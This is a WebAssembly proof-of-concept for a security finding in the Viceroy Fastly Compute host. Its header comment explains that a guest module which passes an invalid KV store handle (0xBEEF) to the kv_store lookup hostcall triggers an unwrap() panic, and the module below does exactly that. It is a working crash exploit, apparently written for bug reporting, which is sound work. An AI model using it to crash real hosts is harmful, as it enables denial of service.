;; PoC for finding 010: Invalid store handle can panic hostcall
;;
;; In src/wiggle_abi/kv_store_impl.rs, multiple functions call
;; get_kv_store_key(store).unwrap() with guest-provided store handles.
;; An unmapped KvStoreHandle causes a host panic.
;;
;; Trigger: serve this module with Viceroy and send any HTTP request.
;; Expected: host panic on unwrap() when the bogus store handle is looked up.

(module
  (import "fastly_kv_store" "lookup"
    (func $kv_store_lookup (param i32 i32 i32 i32 i32 i32) (result i32)))

  (memory (export "memory") 1)

  ;; String "mykey" at offset 0
  (data (i32.const 0) "mykey")

  (func (export "_start")
    ;; Call KV store lookup with an invalid store handle
    (call $kv_store_lookup
      (i32.const 0xBEEF)  ;; invalid store handle
      (i32.const 0)       ;; key pointer
      (i32.const 5)       ;; key length
      (i32.const 0)       ;; lookup_config_mask (no options)
      (i32.const 200)     ;; lookup_config pointer (unused)
      (i32.const 300)     ;; handle_out pointer
    )
    drop
  )
)
